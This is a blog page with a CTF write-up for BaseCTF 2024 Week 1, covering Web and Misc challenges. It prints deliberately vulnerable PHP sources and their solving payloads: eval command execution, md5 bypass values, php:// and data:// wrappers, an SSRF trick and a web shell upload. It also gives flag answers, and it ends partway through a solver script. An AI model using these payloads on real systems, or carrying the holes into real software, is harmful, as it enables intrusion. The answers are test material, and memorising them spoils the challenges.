@@ -1,0 +1,862 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+    <meta charset="utf-8">
+
+    
+
+    <!-- 渲染优化 -->
+    <meta name="renderer" content="webkit">
+    <meta name="force-rendering" content="webkit">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta name="HandheldFriendly" content="True" >
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    <!--icon-->
+
+    
+        <link rel="shortcut icon" href="/./img/favicon.ico">
+    
+    
+    
+    
+    
+
+
+    <!-- meta -->
+
+
+<title>2024BaseCTF-Week1 | Wh1teJ0kerのCTF日记</title>
+
+
+
+
+
+    <!-- OpenGraph -->
+
+
+    
+<link rel="stylesheet" href="/css/style/main.css">
+ 
+
+    
+    
+    
+
+    
+
+     
+
+    <!-- custom head -->
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+    <body>
+        <div id="app" tabindex="-1">
+            <header class="header">
+    <div class="header__left">
+        <a href="/" class="button">
+            <span class="logo__text">Wh1teJ0kerのCTF日记</span>
+        </a>
+    </div>
+    <div class="header__right">
+        
+            <div class="navbar__menus">
+                
+                    <a href="/" class="navbar-menu button">HOME</a>
+                
+                    <a href="/archives/" class="navbar-menu button">归档</a>
+                
+                    <a href="/friends/" class="navbar-menu button">友链</a>
+                
+            </div>
+        
+        
+        
+    <a href="/search/" id="btn-search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024" width="24" height="24" fill="currentColor" stroke="currentColor" stroke-width="32"><path d="M192 448c0-141.152 114.848-256 256-256s256 114.848 256 256-114.848 256-256 256-256-114.848-256-256z m710.624 409.376l-206.88-206.88A318.784 318.784 0 0 0 768 448c0-176.736-143.264-320-320-320S128 271.264 128 448s143.264 320 320 320a318.784 318.784 0 0 0 202.496-72.256l206.88 206.88 45.248-45.248z"></path></svg>
+    </a>
+
+
+        
+        
+
+        
+            <a class="dropdown-icon button" id="btn-dropdown" tabindex="0"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" width='24' height='24' fill="none" stroke="currentColor" stroke-width="0.7" stroke-linecap="round" stroke-linejoin="round"><path fill="currentColor" d="M3.314,4.8h13.372c0.41,0,0.743-0.333,0.743-0.743c0-0.41-0.333-0.743-0.743-0.743H3.314c-0.41,0-0.743,0.333-0.743,0.743C2.571,4.467,2.904,4.8,3.314,4.8z M16.686,15.2H3.314c-0.41,0-0.743,0.333-0.743,0.743s0.333,0.743,0.743,0.743h13.372c0.41,0,0.743-0.333,0.743-0.743S17.096,15.2,16.686,15.2z M16.686,9.257H3.314c-0.41,0-0.743,0.333-0.743,0.743s0.333,0.743,0.743,0.743h13.372c0.41,0,0.743-0.333,0.743-0.743S17.096,9.257,16.686,9.257z"></path></svg></a>
+            <div class="dropdown-menus" id="dropdown-menus">
+                
+                    <a href="/" class="dropdown-menu button">HOME</a>
+                
+                    <a href="/archives/" class="dropdown-menu button">归档</a>
+                
+                    <a href="/friends/" class="dropdown-menu button">友链</a>
+                
+            </div>
+        
+    </div>
+</header>
+
+
+            <main class="main">
+    
+
+<div class="post-title">
+    <h1 class="post-title__text">
+        2024BaseCTF-Week1
+    </h1>
+    <div class="post-title__meta">
+        <a href="/archives/2024/08/" class="post-meta__date button">2024-08-15</a>
+        
+ 
+        
+     
+    <span id="leancloud_container_page_pv" hidden>
+        <span class="separate-dot"></span>
+        <span></span>
+        <span id="leancloud_value_page_pv"></span>
+        <span>Views</span>
+    </span>
+
+    
+
+
+ 
+
+ 
+    </div>
+</div>
+
+
+    <aside class="post-side">
+        <div class="post-side__toc">
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-HTTP-%E6%98%AF%E4%BB%80%E4%B9%88%E5%91%80"><span class="toc-number">1.</span> <span class="toc-text">[Week1] HTTP 是什么呀</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-%E5%96%B5%E5%96%B5%E5%96%B5%C2%B4%E2%80%A2%EF%BB%8C%E2%80%A2"><span class="toc-number">2.</span> <span class="toc-text">[Week1] 喵喵喵´•ﻌ•&#96;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-md5%E7%BB%95%E8%BF%87%E6%AC%B8"><span class="toc-number">3.</span> <span class="toc-text">[Week1] md5绕过欸</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-A-Dark-Room"><span class="toc-number">4.</span> <span class="toc-text">[Week1] A Dark Room</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-upload"><span class="toc-number">5.</span> <span class="toc-text">[Week1] upload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-Aura-%E9%85%B1%E7%9A%84%E7%A4%BC%E7%89%A9"><span class="toc-number">6.</span> <span class="toc-text">[Week1] Aura 酱的礼物</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-%E7%AD%BE%E5%88%B0%EF%BC%81DK-%E7%9B%BE%EF%BC%81"><span class="toc-number">7.</span> <span class="toc-text">[Week1] 签到！DK 盾！</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-%E6%B5%B7%E4%B8%8A%E9%81%87%E5%88%B0%E4%BA%86%E9%B2%A8%E9%B1%BC"><span class="toc-number">8.</span> <span class="toc-text">[Week1] 海上遇到了鲨鱼</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-Base"><span class="toc-number">9.</span> <span class="toc-text">[Week1] Base</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-%E6%AD%A3%E7%9D%80%E7%9C%8B%E8%BF%98%E6%98%AF%E5%8F%8D%E7%9D%80%E7%9C%8B%E5%91%A2%EF%BC%9F"><span class="toc-number">10.</span> <span class="toc-text">[Week1] 正着看还是反着看呢？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD%EF%BC%8C%E6%88%91%E7%94%A8Python"><span class="toc-number">11.</span> <span class="toc-text">[Week1] 人生苦短，我用Python</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-%E4%BD%A0%E4%B9%9F%E5%96%9C%E6%AC%A2%E5%9C%A3%E7%89%A9%E5%90%97"><span class="toc-number">12.</span> <span class="toc-text">[Week1] 你也喜欢圣物吗</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-%E6%A0%B9%E6%9C%AC%E8%BF%9B%E4%B8%8D%E5%8E%BB%E5%95%8A"><span class="toc-number">13.</span> <span class="toc-text">[Week1] 根本进不去啊!</span></a></li></ol>
+        </div>
+    </aside>
+    <a class="btn-toc button" id="btn-toc" tabindex="0">
+        <svg viewBox="0 0 1024 1024" width="32" height="32" xmlns="http://www.w3.org/2000/svg">
+            <path d="M128 256h64V192H128zM320 256h576V192H320zM128 544h64v-64H128zM320 544h576v-64H320zM128 832h64v-64H128zM320 832h576v-64H320z" fill="currentColor"></path>
+        </svg>
+    </a>
+    <div class="toc-menus" id="toc-menus">
+        <div class="toc-title">Article Directory</div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-HTTP-%E6%98%AF%E4%BB%80%E4%B9%88%E5%91%80"><span class="toc-number">1.</span> <span class="toc-text">[Week1] HTTP 是什么呀</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-%E5%96%B5%E5%96%B5%E5%96%B5%C2%B4%E2%80%A2%EF%BB%8C%E2%80%A2"><span class="toc-number">2.</span> <span class="toc-text">[Week1] 喵喵喵´•ﻌ•&#96;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-md5%E7%BB%95%E8%BF%87%E6%AC%B8"><span class="toc-number">3.</span> <span class="toc-text">[Week1] md5绕过欸</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-A-Dark-Room"><span class="toc-number">4.</span> <span class="toc-text">[Week1] A Dark Room</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-upload"><span class="toc-number">5.</span> <span class="toc-text">[Week1] upload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-Aura-%E9%85%B1%E7%9A%84%E7%A4%BC%E7%89%A9"><span class="toc-number">6.</span> <span class="toc-text">[Week1] Aura 酱的礼物</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-%E7%AD%BE%E5%88%B0%EF%BC%81DK-%E7%9B%BE%EF%BC%81"><span class="toc-number">7.</span> <span class="toc-text">[Week1] 签到！DK 盾！</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-%E6%B5%B7%E4%B8%8A%E9%81%87%E5%88%B0%E4%BA%86%E9%B2%A8%E9%B1%BC"><span class="toc-number">8.</span> <span class="toc-text">[Week1] 海上遇到了鲨鱼</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-Base"><span class="toc-number">9.</span> <span class="toc-text">[Week1] Base</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-%E6%AD%A3%E7%9D%80%E7%9C%8B%E8%BF%98%E6%98%AF%E5%8F%8D%E7%9D%80%E7%9C%8B%E5%91%A2%EF%BC%9F"><span class="toc-number">10.</span> <span class="toc-text">[Week1] 正着看还是反着看呢？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD%EF%BC%8C%E6%88%91%E7%94%A8Python"><span class="toc-number">11.</span> <span class="toc-text">[Week1] 人生苦短，我用Python</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-%E4%BD%A0%E4%B9%9F%E5%96%9C%E6%AC%A2%E5%9C%A3%E7%89%A9%E5%90%97"><span class="toc-number">12.</span> <span class="toc-text">[Week1] 你也喜欢圣物吗</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1-%E6%A0%B9%E6%9C%AC%E8%BF%9B%E4%B8%8D%E5%8E%BB%E5%95%8A"><span class="toc-number">13.</span> <span class="toc-text">[Week1] 根本进不去啊!</span></a></li></ol>
+    </div>
+
+
+<article class="post post__with-toc content-card">
+    <div class="post__header"></div>
+    <div class="post__content">
+        <h1 id="2024BaseCTF-Week1"><a href="#2024BaseCTF-Week1" class="headerlink" title="2024BaseCTF-Week1"></a>2024BaseCTF-Week1</h1><p>备注：图片图床使用为Github，打不开需要挂梯子！</p>
+<hr>
+<p>PS：感觉隔壁Moe比较有意思，所以这边就只做了Web和Misc，还只做了一周，见谅</p>
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Week1-HTTP-是什么呀"><a href="#Week1-HTTP-是什么呀" class="headerlink" title="[Week1] HTTP 是什么呀"></a>[Week1] HTTP 是什么呀</h2><p>​<img src="https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/20240916164718.png" class="lazy" data-srcset="https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/20240916164718.png" srcset="./img/load.gif" alt="image">​</p>
+<p>稍微需要注意的就是那个Url转义，要进行一次编码才行</p>
+<p>​<img src="https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/20240916164720.png" class="lazy" data-srcset="https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/20240916164720.png" srcset="./img/load.gif" alt="image">​</p>
+<p>最终的flag需要看success.php，在网络传输这里可以看到</p>
+<p>​<img src="https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/20240916164721.png" class="lazy" data-srcset="https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/20240916164721.png" srcset="./img/load.gif" alt="image">​</p>
+<h2 id="Week1-喵喵喵´•ﻌ•"><a href="#Week1-喵喵喵´•ﻌ•" class="headerlink" title="[Week1] 喵喵喵´•ﻌ•&#96;"></a>[Week1] 喵喵喵´•ﻌ•&#96;</h2><pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
+<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
+
+<span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;DT&#x27;</span>];
+
+<span class="keyword">eval</span>(<span class="variable">$a</span>);
+
+<span class="meta">?&gt;</span></code></pre>
+
+<p>一个没有任何过滤的命令执行</p>
+<pre><code class="highlight php">?DT=<span class="title function_ invoke__">system</span>(<span class="string">&quot;ls /&quot;</span>);
+?DT=<span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag&quot;</span>);</code></pre>
+
+<h2 id="Week1-md5绕过欸"><a href="#Week1-md5绕过欸" class="headerlink" title="[Week1] md5绕过欸"></a>[Week1] md5绕过欸</h2><pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
+<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
+<span class="keyword">require</span> <span class="string">&#x27;flag.php&#x27;</span>;
+
+<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password2&#x27;</span>]) )&#123;
+    <span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];
+    <span class="variable">$name2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name2&#x27;</span>];
+    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];
+    <span class="variable">$password2</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password2&#x27;</span>];
+    <span class="keyword">if</span> (<span class="variable">$name</span> != <span class="variable">$password</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$name</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>))&#123;
+        <span class="keyword">if</span> (<span class="variable">$name2</span> !== <span class="variable">$password2</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$name2</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$password2</span>))&#123;
+            <span class="keyword">echo</span> <span class="variable">$flag</span>;
+        &#125;
+        <span class="keyword">else</span>&#123;
+            <span class="keyword">echo</span> <span class="string">&quot;再看看啊，马上绕过嘞！&quot;</span>;
+        &#125;
+    &#125;
+    <span class="keyword">else</span> &#123;
+        <span class="keyword">echo</span> <span class="string">&quot;错啦错啦&quot;</span>;
+    &#125;
+
+&#125;
+<span class="keyword">else</span> &#123;
+    <span class="keyword">echo</span> <span class="string">&#x27;没看到参数呐&#x27;</span>;
+&#125;
+<span class="meta">?&gt;</span></code></pre>
+
+<p>md5绕过</p>
+<pre><code class="highlight php">Get：?name=QNKCDZO&amp;name2[]=<span class="number">1</span>
+Post：password=s214587387a&amp;password2[]=<span class="number">2</span></code></pre>
+
+<h2 id="Week1-A-Dark-Room"><a href="#Week1-A-Dark-Room" class="headerlink" title="[Week1] A Dark Room"></a>[Week1] A Dark Room</h2><p>​<img src="https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/20240916164722.png" class="lazy" data-srcset="https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/20240916164722.png" srcset="./img/load.gif" alt="image">js前端泄露</p>
+<h2 id="Week1-upload"><a href="#Week1-upload" class="headerlink" title="[Week1] upload"></a>[Week1] upload</h2><p>一个简单的木马上传，没有任何过滤，上传一句话木马shell.php后直接蚁剑连接即可</p>
+<p>路径为url&#x2F;upload&#x2F;[文件名]</p>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
+<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;
+    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
+    <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>];
+    <span class="variable">$filename</span> = <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>];
+    <span class="variable">$filetype</span> = <span class="variable">$file</span>[<span class="string">&#x27;type&#x27;</span>];
+    <span class="variable">$filesize</span> = <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>];
+    <span class="variable">$filetmp</span> = <span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>];
+    <span class="variable">$fileerror</span> = <span class="variable">$file</span>[<span class="string">&#x27;error&#x27;</span>];
+
+    <span class="keyword">if</span> (<span class="variable">$fileerror</span> === <span class="number">0</span>) &#123;
+        <span class="variable">$destination</span> = <span class="string">&#x27;uploads/&#x27;</span> . <span class="variable">$filename</span>;
+        <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$filetmp</span>, <span class="variable">$destination</span>);
+        <span class="keyword">echo</span> <span class="string">&#x27;File uploaded successfully&#x27;</span>;
+    &#125; <span class="keyword">else</span> &#123;
+        <span class="keyword">echo</span> <span class="string">&#x27;Error uploading file&#x27;</span>;
+    &#125;
+&#125;
+<span class="meta">?&gt;</span>
+&lt;!DOCTYPE html&gt;
+&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;
+
+&lt;head&gt;
+    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;
+    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;
+    &lt;title&gt;上传你喜欢的图片吧！&lt;/title&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+    &lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;
+        &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span>&gt;
+        &lt;button type=<span class="string">&quot;submit&quot;</span>&gt;上传！&lt;/button&gt;
+    &lt;/form&gt;
+    <span class="meta">&lt;?php</span>
+    <span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;uploads&#x27;</span>);
+    <span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;
+        <span class="keyword">if</span> (<span class="variable">$file</span> === <span class="string">&#x27;.&#x27;</span> || <span class="variable">$file</span> === <span class="string">&#x27;..&#x27;</span>) &#123;
+            <span class="keyword">continue</span>;
+        &#125;
+        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;uploads/<span class="subst">$file</span>&#x27; style=\&quot;max-height: 200px;\&quot; /&gt;&quot;</span>;
+    &#125;
+    <span class="meta">?&gt;</span>
+&lt;/body&gt;
+
+&lt;/html&gt; File uploaded successfully</code></pre>
+
+<h2 id="Week1-Aura-酱的礼物"><a href="#Week1-Aura-酱的礼物" class="headerlink" title="[Week1] Aura 酱的礼物"></a>[Week1] Aura 酱的礼物</h2><pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
+<span class="comment">// Aura 酱，欢迎回家~</span>
+<span class="comment">// 这里有一份礼物，请你签收一下哟~</span>
+<span class="variable">$pen</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pen&#x27;</span>];
+<span class="keyword">if</span> (<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$pen</span>) !== <span class="string">&#x27;Aura&#x27;</span>)
+&#123;
+    <span class="keyword">die</span>(<span class="string">&#x27;这是 Aura 的礼物，你不是 Aura！&#x27;</span>);
+&#125;
+
+<span class="comment">// 礼物收到啦，接下来要去博客里面写下感想哦~</span>
+<span class="variable">$challenge</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;challenge&#x27;</span>];
+<span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$challenge</span>, <span class="string">&#x27;http://jasmineaura.github.io&#x27;</span>) !== <span class="number">0</span>)
+&#123;
+    <span class="keyword">die</span>(<span class="string">&#x27;这不是 Aura 的博客！&#x27;</span>);
+&#125;
+
+<span class="variable">$blog_content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$challenge</span>);
+<span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$blog_content</span>, <span class="string">&#x27;已经收到Kengwang的礼物啦&#x27;</span>) === <span class="literal">false</span>)
+&#123;
+    <span class="keyword">die</span>(<span class="string">&#x27;请去博客里面写下感想哦~&#x27;</span>);
+&#125;
+
+<span class="comment">// 嘿嘿，接下来要拆开礼物啦，悄悄告诉你，礼物在 flag.php 里面哦~</span>
+<span class="variable">$gift</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;gift&#x27;</span>];
+<span class="keyword">include</span>(<span class="variable">$gift</span>);</code></pre>
+
+<p>观察一下，发现pen参数传入，但是是file_get_contents函数，可以通过伪协议将内容读取</p>
+<pre><code class="highlight php">pen=data:<span class="comment">//text/plain,Aura</span></code></pre>
+
+<p>然后是challenge的参数，可以使用一个SSRF的服务端绕过</p>
+<pre><code class="highlight php">challenge=http:<span class="comment">//jasmineaura.github.io@127.0.0.1</span></code></pre>
+
+<p>最后的include就是一个单纯的文件包含读取即可</p>
+<pre><code class="highlight php">gift=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></code></pre>
+
+<p>​<img src="https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/20240916164724.png" class="lazy" data-srcset="https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/20240916164724.png" srcset="./img/load.gif" alt="image">​</p>
+<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Week1-签到！DK-盾！"><a href="#Week1-签到！DK-盾！" class="headerlink" title="[Week1] 签到！DK 盾！"></a>[Week1] 签到！DK 盾！</h2><p>​<img src="https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/20240916164725.png" class="lazy" data-srcset="https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/20240916164725.png" srcset="./img/load.gif" alt="image">​</p>
+<pre><code class="highlight php">BaseCTF&#123;<span class="number">2024</span>_sp0n5ored_by_dkdun&#125;</code></pre>
+
+<h2 id="Week1-海上遇到了鲨鱼"><a href="#Week1-海上遇到了鲨鱼" class="headerlink" title="[Week1] 海上遇到了鲨鱼"></a>[Week1] 海上遇到了鲨鱼</h2><p>​<img src="https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/20240916164726.png" class="lazy" data-srcset="https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/20240916164726.png" srcset="./img/load.gif" alt="image">​</p>
+<p>倒序即得</p>
+<pre><code class="highlight php">BaseCTF&#123;<span class="number">15</span>ef386b-a3a7-<span class="number">7344</span>-<span class="number">3</span>b05-ac367316fb76&#125;</code></pre>
+
+<h2 id="Week1-Base"><a href="#Week1-Base" class="headerlink" title="[Week1] Base"></a>[Week1] Base</h2><p>Base32+Base64</p>
+<pre><code class="highlight php">BaseCTF&#123;we1c0me_to_b4sectf&#125;</code></pre>
+
+<h2 id="Week1-正着看还是反着看呢？"><a href="#Week1-正着看还是反着看呢？" class="headerlink" title="[Week1] 正着看还是反着看呢？"></a>[Week1] 正着看还是反着看呢？</h2><p>下载下来010打开发现是一个Jpg图片，但是倒序的，逆一下</p>
+<p>​<img src="https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/20240916164728.png" class="lazy" data-srcset="https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/20240916164728.png" srcset="./img/load.gif" alt="image">​</p>
+<p>Binwalk分离出来一个压缩包，然后打开即得flag</p>
+<h2 id="Week1-人生苦短，我用Python"><a href="#Week1-人生苦短，我用Python" class="headerlink" title="[Week1] 人生苦短，我用Python"></a>[Week1] 人生苦短，我用Python</h2><pre><code class="highlight python"><span class="keyword">import</span> base64
+<span class="keyword">import</span> hashlib
+
+<span class="keyword">def</span> <span class="title function_">abort</span>(<span class="params"><span class="built_in">id</span></span>):
+    <span class="built_in">print</span>(<span class="string">&#x27;You failed test %d. Try again!&#x27;</span> % <span class="built_in">id</span>)
+    exit(<span class="number">1</span>)
+
+<span class="built_in">print</span>(<span class="string">&#x27;Hello, Python!&#x27;</span>)
+flag = <span class="built_in">input</span>(<span class="string">&#x27;Enter your flag: &#x27;</span>)
+
+<span class="keyword">if</span> <span class="built_in">len</span>(flag) != <span class="number">38</span>:
+    abort(<span class="number">1</span>)
+
+<span class="keyword">if</span> <span class="keyword">not</span> flag.startswith(<span class="string">&#x27;BaseCTF&#123;&#x27;</span>):
+    abort(<span class="number">2</span>)
+
+<span class="keyword">if</span> flag.find(<span class="string">&#x27;Mp&#x27;</span>) != <span class="number">10</span>:
+    abort(<span class="number">3</span>)
+
+<span class="keyword">if</span> flag[-<span class="number">3</span>:] * <span class="number">8</span> != <span class="string">&#x27;3x&#125;3x&#125;3x&#125;3x&#125;3x&#125;3x&#125;3x&#125;3x&#125;&#x27;</span>:
+    abort(<span class="number">4</span>)
+
+<span class="keyword">if</span> <span class="built_in">ord</span>(flag[-<span class="number">1</span>]) != <span class="number">125</span>:
+    abort(<span class="number">5</span>)
+
+<span class="keyword">if</span> flag.count(<span class="string">&#x27;_&#x27;</span>) // <span class="number">2</span> != <span class="number">2</span>:
+    abort(<span class="number">6</span>)
+
+<span class="keyword">if</span> <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">len</span>, flag.split(<span class="string">&#x27;_&#x27;</span>))) != [<span class="number">14</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">8</span>]:
+    abort(<span class="number">7</span>)
+
+<span class="keyword">if</span> flag[<span class="number">12</span>:<span class="number">32</span>:<span class="number">4</span>] != <span class="string">&#x27;lsT_n&#x27;</span>:
+    abort(<span class="number">8</span>)
+
+<span class="keyword">if</span> <span class="string">&#x27;😺&#x27;</span>.join([c.upper() <span class="keyword">for</span> c <span class="keyword">in</span> flag[:<span class="number">9</span>]]) != <span class="string">&#x27;B😺A😺S😺E😺C😺T😺F😺&#123;😺S&#x27;</span>:
+    abort(<span class="number">9</span>)
+
+<span class="keyword">if</span> <span class="keyword">not</span> flag[-<span class="number">11</span>].isnumeric() <span class="keyword">or</span> <span class="built_in">int</span>(flag[-<span class="number">11</span>]) ** <span class="number">5</span> != <span class="number">1024</span>:
+    abort(<span class="number">10</span>)
+
+<span class="keyword">if</span> base64.b64encode(flag[-<span class="number">7</span>:-<span class="number">3</span>].encode()) != <span class="string">b&#x27;MG1QbA==&#x27;</span>:
+    abort(<span class="number">11</span>)
+
+<span class="keyword">if</span> flag[::-<span class="number">7</span>].encode().<span class="built_in">hex</span>() != <span class="string">&#x27;7d4372733173&#x27;</span>:
+    abort(<span class="number">12</span>)
+
+<span class="keyword">if</span> <span class="built_in">set</span>(flag[<span class="number">12</span>::<span class="number">11</span>]) != &#123;<span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;r&#x27;</span>&#125;:
+    abort(<span class="number">13</span>)
+
+<span class="keyword">if</span> flag[<span class="number">21</span>:<span class="number">27</span>].encode() != <span class="built_in">bytes</span>([<span class="number">116</span>, <span class="number">51</span>, <span class="number">114</span>, <span class="number">95</span>, <span class="number">84</span>, <span class="number">104</span>]):
+    abort(<span class="number">14</span>)
+
+<span class="keyword">if</span> <span class="built_in">sum</span>(<span class="built_in">ord</span>(c) * <span class="number">2024_08_15</span> ** idx <span class="keyword">for</span> idx, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(flag[<span class="number">17</span>:<span class="number">20</span>])) != <span class="number">41378751114180610</span>:
+    abort(<span class="number">15</span>)
+
+<span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">all</span>([flag[<span class="number">0</span>].isalpha(), flag[<span class="number">8</span>].islower(), flag[<span class="number">13</span>].isdigit()]):
+    abort(<span class="number">16</span>)
+
+<span class="keyword">if</span> <span class="string">&#x27;&#123;whats&#125; &#123;up&#125;&#x27;</span>.<span class="built_in">format</span>(whats=flag[<span class="number">13</span>], up=flag[<span class="number">15</span>]).replace(<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;bro&#x27;</span>) != <span class="string">&#x27;bro 1&#x27;</span>:
+    abort(<span class="number">17</span>)
+
+<span class="keyword">if</span> hashlib.sha1(flag.encode()).hexdigest() != <span class="string">&#x27;e40075055f34f88993f47efb3429bd0e44a7f479&#x27;</span>:
+    abort(<span class="number">18</span>)
+
+<span class="built_in">print</span>(<span class="string">&#x27;🎉 You are right!&#x27;</span>)
+<span class="keyword">import</span> this
+</code></pre>
+
+<p>稍微花了点时间，然后看exp吧</p>
+<pre><code class="highlight python"><span class="keyword">import</span> hashlib
+<span class="keyword">import</span> base64
+<span class="comment">#step1</span>
+flag = [<span class="string">&#x27;0&#x27;</span>] * <span class="number">38</span>
+<span class="built_in">print</span>(<span class="string">&#x27;Step1:&#x27;</span>, <span class="string">&#x27;&#x27;</span>.join(flag))
+<span class="comment">#Step2</span>
+flag[<span class="number">0</span>:<span class="number">8</span>] = <span class="built_in">list</span>(<span class="string">&#x27;BaseCTF&#123;&#x27;</span>)
